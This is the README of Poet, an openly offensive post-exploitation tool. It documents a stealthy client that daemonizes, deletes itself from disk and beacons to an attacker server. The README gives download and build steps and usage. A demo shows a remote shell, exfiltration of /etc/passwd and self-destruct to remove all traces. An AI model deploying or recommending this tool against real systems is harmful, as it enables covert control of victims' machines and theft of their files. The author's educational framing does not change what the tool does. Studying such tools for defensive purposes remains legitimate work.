# poet

A simple POst-Exploitation Tool.

## overview

The client program runs on the target machine and is configured with an IP
address (the server) to connect to and a frequency to connect at. If the server
isn't running when the client tries to connect, the client quietly sleeps and
tries again at the next interval. If the server is running however, the
attacker gets a control shell to control the client and perform various actions
on the target including:

- reconnaissance
- remote shell
- file exfiltration
- download and execute
- self destruct

## demo

This is just a small sample of what Poet can do.

The scenario is, an attacker has gotten access to the victim's machine and
downloaded and executed the client.  She does not have
the server running at this point, but it's ok, the client waits patiently.
Eventually the attacker is ready and starts the server, first starting a shell
and executing `uname -a`, then exfiltrating `/etc/passwd`. Then she exits
and detaches from the client, which continues running on the target waiting for
the next opportunity to connect to the server. Later, she connects again,
self-destructing the client, removing all traces from the target.

Victim's Machine (5.4.3.2):

```
$ ./poet-client 1.2.3.4 10  # poet-client daemonizes, so there's nothing to see
```

> Warning: After running this command, you'll need to either run `selfdestruct`
> from the server, or kill the `poet-client` process to stop the client.

Attacker's Machine (1.2.3.4):

```
$ sudo ./poet-server

                          _
        ____  ____  ___  / /_
       / __ \/ __ \/ _ \/ __/
      / /_/ / /_/ /  __/ /
     / .___/\____/\___/\__/
    /_/

[+] (06/28/15 03:58:42) Dropping privileges to uid: 501, gid: 20
[+] (06/28/15 03:58:42) Poet server started (port 443)
[+] (06/28/15 03:58:50) Connected By: ('127.0.0.1', 54494) -> VALID
[+] (06/28/15 03:58:50) Entering control shell
Welcome to posh, the Poet Shell!
Running `help' will give you a list of supported commands.
posh > help
Commands:
  chint
  dlexec
  exec
  exfil
  exit
  help
  recon
  selfdestruct
  shell
posh > shell
posh > user@server $ uname -a
Linux lolServer 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed May 07 16:19:23 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
posh > user@server $ ^D
posh > exfil /etc/passwd
posh : exfil written to archive/20150628/exfil/passwd-201506285917.txt
posh > ^D
[+] (06/28/15 03:59:18) Exiting control shell
[-] (06/28/15 03:59:18) Poet server terminated
$ sudo ./poet-server

                          _
        ____  ____  ___  / /_
       / __ \/ __ \/ _ \/ __/
      / /_/ / /_/ /  __/ /
     / .___/\____/\___/\__/
    /_/

[+] (06/28/15 03:59:26) Dropping privileges to uid: 501, gid: 20
[+] (06/28/15 03:59:26) Poet server started (port 443)
[+] (06/28/15 03:59:28) Connected By: ('127.0.0.1', 54542) -> VALID
[+] (06/28/15 03:59:28) Entering control shell
Welcome to posh, the Poet Shell!
Running `help' will give you a list of supported commands.
posh > selfdestruct
[!] WARNING: You are about to permanently remove the client from the target.
    You will immediately lose access to the target. Continue? (y/n) y
[+] (06/28/15 03:59:33) Exiting control shell
[-] (06/28/15 03:59:33) Poet server terminated
```

## getting started

Go to the [releases](http://github.com/mossberg/poet/releases) page and
download the latest `poet-client` and `poet-server` files available.

Then skip to the Usage section below.

Alternatively, you can build Poet yourself (it's pretty easy, see below).

## building

Make sure you have the `python2.7` and `zip` executables available.

```
$ git clone https://github.com/mossberg/poet
$ cd poet
$ make
```

This will create a `bin/` directory which contains `poet-client`
and `poet-server`.

## usage

Poet is super easy to use, and requires nothing more than the Python (2.7)
standard library. To easily test it out, a typical invocation would look like:

Terminal 1:

```
$ ./poet-client 127.0.0.1 1 --debug --no-selfdestruct
```

> By default, the Poet client daemonizes and deletes itself from disk, so
> that behavior is suppressed using the `--debug` and `--no-selfdestruct`
> flags.

Terminal 2:

```
$ sudo ./poet-server
```

> By default, the server needs to be run as root (using `sudo`) because
> the default port it binds to is 443. If that makes you uncomfortable, simply
> omit `sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
> nice, high number for your port (> 1024).

### configuration

The `common/config.py` file contains various **optional** configuration
settings for Poet builds.

- `AUTH`: Secret authentication token shared between the client and server for
  client authentication. Note that the default one is anything but secret. For
  any non-testing usage, it is recommended to change it to another unguessable
  value.  Note that pre-built packages use the default, public authentication
  token.
- `ARCHIVE_DIR`: Directory used by the server to store files (exec output,
  exfil, recon, etc).
- `SERVER_IP`: IP address of the server.
- `BEACON_INTERVAL`: Seconds between client beacons to the server.

The `SERVER_IP` and `BEACON_INTERVAL` configurations allow information
previously required in command line arguments to be baked into the final
executables such that the final executable can simply be executed with no
arguments. Values of `None` for either of them cause them to revert to default
behavior (required command line arg for `SERVER_IP`, optional command line
argument for `BEACON_INTERVAL`).

### client

```
$ ./poet-client -h
usage: poet-client [-h] [-p PORT] [--debug] [--no-daemon] [--no-selfdestruct]
                   IP [INTERVAL]

positional arguments:
  IP                    Poet Server
  INTERVAL              Beacon Interval, in seconds. Default: 600

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
  --debug               show debug messages. implies --no-daemon
  --no-daemon           don't daemonize
  --no-selfdestruct     don't selfdestruct
```

Poet is a client/server application. The client is executed on the target and
beacons back to the server at a certain time interval. The only required
argument is the IP address where the server is or will be running. Following
it can optionally be the time interval in seconds of how frequently to beacon
back, which defaults to 10 minutes. The port for the client to beacon out on
can be specified with the `-p` flag. All other flags would not be used during
"real" usage and exist mainly for debugging.

### server

```
$ ./poet-server -h
usage: poet-server [-h] [-p PORT] [-v]

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
  -v, --version         prints the Poet version number and exits
```

The server is executed on the user's own machine and listens for beacons from
the client. By default, it listens on a privileged port (443) and must be run
with privileges (which are quickly dropped after binding). The `-p` flag can
be used to bypass this by selecting an unprivileged port to listen on (>1024).

### extensibility

Poet is highly extensible through its module framework, in fact, nearly every
command available at the posh shell is implemented as a module. They can be
viewed in the `common/modules/` directory. The `common/modules/template.py`
serves as a barebones example module, to be used as a starting point.
To add a Poet module, simply place it into the `common/modules/` directory
and rebuild Poet using `make`.

Here is a simple example module showing basic communication between the client
and server. The module registers a posh command, sends a string over, the
client reverses it and sends it back, and the server prints it out.

```
# Note: this module doesn't check if an argv[1] was given

import module


@module.server_handler('reverse')
def server(server, argv):
    print 'Sending: {}'.format(argv[1])
    # argv here is ['reverse', ...]
    response = server.conn.exchange(' '.join(argv))
    print 'Received: {}'.format(response)


@module.client_handler('reverse')
def client(client, inp):
    # inp here is 'reverse ...'
    client.s.send(inp.split()[1][::-1])
```

The module begins with

```
import module
```

This is required, and is needed to register with the module framework.

The next section is the server-side component of the module.

```
@module.server_handler('reverse')
def server(server, argv):
    print 'Sending: {}'.format(argv[1])
    # argv here is ['reverse', ...]
    response = server.conn.exchange(' '.join(argv))
    print 'Received: {}'.format(response)
```

The `@module.server_handler()` decorator is used to register a posh command
by passing in the command name as a decorator parameter and defining a handler
function to execute when the command is run. The handler function must accept
two parameters. One is the instance of the `PoetServer` that called the module,
and the other is the command string entered, represented as a list of
arguments. The server instance exists for the module to be able to use
helper functions for communicating with the client, writing files to the
archive directory, etc. The module uses `server.conn.exchange()` to send
the command line entered as a string to the client and get the response as the
return value.

The client-side component of the module is next.

```
@module.client_handler('reverse')
def client(client, inp):
    # inp here is 'reverse ...'
    client.s.send(inp.split()[1][::-1])
```

The `@module.client_handler()` decorator is used to register a task for the
client to react to and process. Since the client and server communicate by
passing strings between them the first part of the string is the keyword
for a particular task. The module registers a client handler function to
execute when a message comes in from the server starting with 'reverse'.
Similar to the server handler, the client handler must accept parameters for
the instance of the `PoetClient` which called it, and the input string
passed from the server. The client then uses the `client.s.send()` function
to send data back to the server, in this case, the first argument, reversed.

In action, this looks like

```
posh > reverse poet
Sending: poet
Received: teop
```

## concerns

Documented concerns:

- lack of cryptographically protected communications
- low interval beacons are **noisy** and generate TCP RSTs when the server is
  inactive
- shell command is not a "real" shell and does not support most builtins found
  in standard shells

## disclaimer

I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others
interested in learning about this sort of thing. Use it responsibly.
